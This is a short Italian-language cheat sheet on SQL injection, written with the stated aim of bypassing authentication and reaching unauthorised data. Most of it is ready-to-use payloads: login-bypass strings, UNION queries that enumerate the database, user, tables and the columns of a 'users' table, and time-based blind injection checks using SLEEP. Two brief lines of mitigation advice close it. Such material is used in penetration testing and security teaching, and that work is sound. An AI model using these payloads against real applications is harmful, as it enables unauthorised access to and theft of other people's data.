# SQL Injection

### **Obiettivo**
Manipolare query SQL per bypassare l'autenticazione o accedere a dati non autorizzati.

### **Payload di Base**

- **Bypass Login:**
    ```sql
  ' OR '1'='1 -- -
  " OR "1"="1 -- -
    ```

- **Ottenere dati:**
    ```sql
  ' UNION SELECT null, database(), user() --
  ' UNION SELECT 1,2,table_name FROM information_schema.tables --
    ```

- **Esfiltrare una colonna specifica:**
    ```sql
  ' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users' --
    ```

### **Blind SQL Injection**

- **Verifica di una condizione:**
    ```sql
  ' AND IF(1=1, SLEEP(5), 0) --
  ' AND (SELECT CASE WHEN (username='admin') THEN SLEEP(5) ELSE 0 END) --
    ```

### **Mitigazione**
- Usa query parametrizzate/preparate.
- Non concatenare mai input utente direttamente in query SQL.
